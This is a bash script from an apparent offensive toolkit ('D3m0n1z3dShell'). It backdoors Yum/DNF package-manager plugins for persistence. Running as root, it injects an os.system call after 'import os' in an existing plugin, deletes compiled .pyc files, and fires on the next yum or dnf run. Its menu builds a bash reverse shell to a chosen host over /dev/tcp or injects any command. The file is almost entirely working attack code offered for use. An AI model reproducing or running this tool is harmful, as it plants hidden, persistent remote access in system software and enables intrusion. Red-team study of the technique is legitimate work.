#!/bin/bash
# D3m0n1z3dShell — Yum/DNF Plugin Backdoor (T1546)
# Based on Metasploit yum_package_manager.rb — inject into existing Yum plugin

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
MARKER="d3m0n_yum"

banner(){
    echo -e "${RED}"
    echo " ╔═══════════════════════════════════════════════════╗"
    echo " ║   Yum/DNF Plugin Backdoor Persistence             ║"
    echo " ║   T1546 — Inject payload into package manager     ║"
    echo " ╚═══════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

check_root(){
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[-] Root required${NC}"; exit 1; }
}

detect_pkg_manager(){
    if command -v yum >/dev/null 2>&1; then
        echo "yum"
    elif command -v dnf >/dev/null 2>&1; then
        echo "dnf"
    else
        echo "none"
    fi
}

list_yum_plugins(){
    local PLUGIN_DIR="$1"
    echo -e "${CYAN}[*] Plugins in ${PLUGIN_DIR}:${NC}"
    for f in "${PLUGIN_DIR}"/*.py; do
        [[ -f "$f" ]] || continue
        local name=$(basename "$f")
        local has_os=$(grep -c 'import os' "$f" 2>/dev/null)
        local backdoored=$(grep -c "$MARKER" "$f" 2>/dev/null)
        local status=""
        [[ "$backdoored" -gt 0 ]] && status="${RED}[BACKDOORED]${NC}" || status="${GREEN}[clean]${NC}"
        echo -e "  $name (import os: $has_os) $status"
    done
}

inject_yum(){
    local PLUGIN_FILE="$1" PAYLOAD="$2"

    if [[ ! -f "$PLUGIN_FILE" ]]; then
        echo -e "${RED}[-] Plugin file not found: ${PLUGIN_FILE}${NC}"
        return 1
    fi

    if ! grep -q 'import os' "$PLUGIN_FILE" 2>/dev/null; then
        echo -e "${RED}[-] Plugin doesn't import os — can't inject${NC}"
        return 1
    fi

    if grep -q "$MARKER" "$PLUGIN_FILE" 2>/dev/null; then
        echo -e "${YELLOW}[*] Already backdoored${NC}"
        return 1
    fi

    # Backup original
    cp "$PLUGIN_FILE" "${PLUGIN_FILE}.d3m0n.bak"

    # Inject after 'import os'
    sed -i "/import os/a\\# ${MARKER}\\nos.system('setsid ${PAYLOAD} 2>/dev/null &')" "$PLUGIN_FILE"

    # Remove .pyc to force recompilation
    rm -f "${PLUGIN_FILE}c" "${PLUGIN_FILE/.py/.pyc}" 2>/dev/null
    find "$(dirname "$PLUGIN_FILE")/__pycache__" -name "$(basename "${PLUGIN_FILE%.py}")*.pyc" -delete 2>/dev/null

    echo -e "${GREEN}[+] Payload injected into ${PLUGIN_FILE}${NC}"
    echo -e "${YELLOW}[*] Triggers on next yum/dnf operation${NC}"
}

menu(){
    banner
    check_root

    local PKG=$(detect_pkg_manager)
    if [[ "$PKG" == "none" ]]; then
        echo -e "${RED}[-] Neither yum nor dnf found on this system${NC}"
        echo -e "${YELLOW}[*] This technique is for RHEL/CentOS/Fedora${NC}"
        return 1
    fi

    echo -e "${CYAN}[*] Detected: ${PKG}${NC}"

    # Determine plugin directories
    local YUM_PLUGIN_DIR="/usr/lib/yum-plugins"
    local DNF_PLUGIN_DIRS=$(find /usr/lib/python*/site-packages/dnf-plugins/ -maxdepth 0 2>/dev/null | head -1)

    echo ""
    echo -e "  ${CYAN}[1]${NC} Install (reverse shell)"
    echo -e "  ${CYAN}[2]${NC} Install (custom command)"
    echo -e "  ${CYAN}[3]${NC} List plugins"
    echo -e "  ${CYAN}[4]${NC} Cleanup"
    echo ""
    read -p "  Choice [1-4]: " OPT

    case "$OPT" in
        1)
            read -p "  LHOST: " LHOST
            read -p "  LPORT: " LPORT
            PAYLOAD="/bin/bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'"

            if [[ "$PKG" == "yum" && -d "$YUM_PLUGIN_DIR" ]]; then
                list_yum_plugins "$YUM_PLUGIN_DIR"
                read -p "  Plugin to backdoor [fastestmirror.py]: " PLUG
                PLUG="${PLUG:-fastestmirror.py}"
                inject_yum "${YUM_PLUGIN_DIR}/${PLUG}" "$PAYLOAD"
            elif [[ -n "$DNF_PLUGIN_DIRS" ]]; then
                list_yum_plugins "$DNF_PLUGIN_DIRS"
                read -p "  Plugin to backdoor: " PLUG
                inject_yum "${DNF_PLUGIN_DIRS}/${PLUG}" "$PAYLOAD"
            fi
            ;;
        2)
            read -p "  Command: " CMD

            if [[ "$PKG" == "yum" && -d "$YUM_PLUGIN_DIR" ]]; then
                list_yum_plugins "$YUM_PLUGIN_DIR"
                read -p "  Plugin [fastestmirror.py]: " PLUG
                PLUG="${PLUG:-fastestmirror.py}"
                inject_yum "${YUM_PLUGIN_DIR}/${PLUG}" "$CMD"
            elif [[ -n "$DNF_PLUGIN_DIRS" ]]; then
                list_yum_plugins "$DNF_PLUGIN_DIRS"
                read -p "  Plugin: " PLUG
                inject_yum "${DNF_PLUGIN_DIRS}/${PLUG}" "$CMD"
            fi
            ;;
        3)
            [[ -d "$YUM_PLUGIN_DIR" ]] && list_yum_plugins "$YUM_PLUGIN_DIR"
            [[ -n "$DNF_PLUGIN_DIRS" ]] && list_yum_plugins "$DNF_PLUGIN_DIRS"
            ;;
        4)
            echo -e "${YELLOW}[*] Restoring backdoored plugins...${NC}"
            for dir in "$YUM_PLUGIN_DIR" $DNF_PLUGIN_DIRS; do
                [[ -d "$dir" ]] || continue
                for bak in "$dir"/*.d3m0n.bak; do
                    [[ -f "$bak" ]] || continue
                    local orig="${bak%.d3m0n.bak}"
                    mv "$bak" "$orig"
                    rm -f "${orig}c" 2>/dev/null
                    echo -e "  ${GREEN}[+] Restored: ${orig}${NC}"
                done
            done
            echo -e "${GREEN}[+] Cleaned${NC}"
            ;;
    esac
}

menu
